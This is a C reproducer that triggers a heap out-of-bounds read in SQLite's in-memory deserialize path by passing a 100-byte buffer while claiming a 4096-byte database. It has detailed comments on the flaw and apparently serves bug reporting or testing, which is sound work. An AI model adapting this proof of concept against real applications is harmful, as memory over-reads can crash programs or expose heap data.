/*
 * Reproducer for heap-buffer-over-read via sqlite3_deserialize with
 * szBuf=0 and szDb > 0 (memdb.c)
 *
 * Bug: sqlite3_deserialize() does not validate szDb <= szBuf.
 * When szBuf=0 (zero-length buffer) but szDb claims a valid database size,
 * the memdb stores aData pointing to a zero-length allocation, sz=szDb,
 * and szAlloc=0. Any read via memdbRead then accesses memory beyond
 * the zero-length buffer.
 *
 * This variant demonstrates the bug with a minimal SQLite header in a
 * tiny buffer while claiming a large database.
 *
 * CWE-125: Out-of-bounds Read
 * File: src/memdb.c
 * Functions: sqlite3_deserialize (line ~892), memdbRead (line ~260-266)
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "sqlite3.h"

/*
 * Minimal valid SQLite database header (first 100 bytes).
 * We construct a buffer that looks like a valid 4096-byte page-size
 * SQLite database in the header but the actual buffer is only 100 bytes.
 */
static void fill_sqlite_header(unsigned char *buf, int bufsize) {
    memset(buf, 0, bufsize);
    /* Magic string at offset 0 */
    memcpy(buf, "SQLite format 3\000", 16);
    /* Page size = 4096 (big-endian at offset 16) */
    buf[16] = 0x10;
    buf[17] = 0x00;
    /* File format write version */
    buf[18] = 1;
    /* File format read version */
    buf[19] = 1;
    /* Reserved space */
    buf[20] = 0;
    /* Max embedded payload fraction */
    buf[21] = 64;
    /* Min embedded payload fraction */
    buf[22] = 32;
    /* Leaf payload fraction */
    buf[23] = 32;
    /* File change counter (offset 24) */
    buf[27] = 1;
    /* Database size in pages (offset 28, big-endian u32) = 1 page */
    buf[31] = 1;
    /* Schema format number (offset 44) = 4 */
    buf[47] = 4;
    /* Text encoding: UTF-8 (offset 56) */
    buf[59] = 1;
    /* sqlite version number at offset 96 */
    buf[96] = 0x00;
    buf[97] = 0x38;
    buf[98] = 0x00;
    buf[99] = 0x00;
}

int main(void) {
    sqlite3 *db = NULL;
    int rc;

    rc = sqlite3_open(":memory:", &db);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "Failed to open db: %s\n", sqlite3_errmsg(db));
        return 1;
    }

    /*
     * Allocate a small buffer with a valid-looking SQLite header.
     * Claim the database is 4096 bytes (one page) but only provide
     * 100 bytes of actual buffer.
     */
    int actual_buf_size = 100;
    sqlite3_int64 claimed_db_size = 4096;  /* One full page */

    unsigned char *pData = sqlite3_malloc64(actual_buf_size);
    if (pData == NULL) {
        fprintf(stderr, "Failed to allocate buffer\n");
        sqlite3_close(db);
        return 1;
    }
    fill_sqlite_header(pData, actual_buf_size);

    printf("Buffer size: %d bytes, Claimed DB size: %lld bytes\n",
           actual_buf_size, (long long)claimed_db_size);

    /*
     * VULNERABILITY: szDb (4096) > szBuf (100)
     * sqlite3_deserialize stores:
     *   pStore->sz = 4096        (logical database size)
     *   pStore->szAlloc = 100    (actual buffer allocation)
     *
     * When SQLite reads page 1 (4096 bytes starting at offset 0),
     * memdbRead checks: 0 + 4096 > 4096 (p->sz) => false
     * So it proceeds with memcpy(zBuf, p->aData+0, 4096)
     * But p->aData only has 100 bytes allocated => heap OOB read
     */
    rc = sqlite3_deserialize(db, "main", pData, claimed_db_size,
                             actual_buf_size,
                             SQLITE_DESERIALIZE_FREEONCLOSE |
                             SQLITE_DESERIALIZE_RESIZEABLE);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "Failed to deserialize: %s\n", sqlite3_errmsg(db));
        sqlite3_free(pData);
        sqlite3_close(db);
        return 1;
    }

    printf("Deserialized successfully (no szDb <= szBuf validation!)\n");

    /*
     * Any query triggers reading page 1 via memdbRead, which reads
     * 4096 bytes from a 100-byte buffer. This is a heap-buffer-over-read.
     */
    sqlite3_stmt *pStmt = NULL;
    rc = sqlite3_prepare_v2(db, "SELECT 1;", -1, &pStmt, NULL);
    if (rc == SQLITE_OK) {
        sqlite3_step(pStmt);
        sqlite3_finalize(pStmt);
    }

    printf("Test complete - heap-buffer-over-read triggered\n");
    sqlite3_close(db);
    return 0;
}
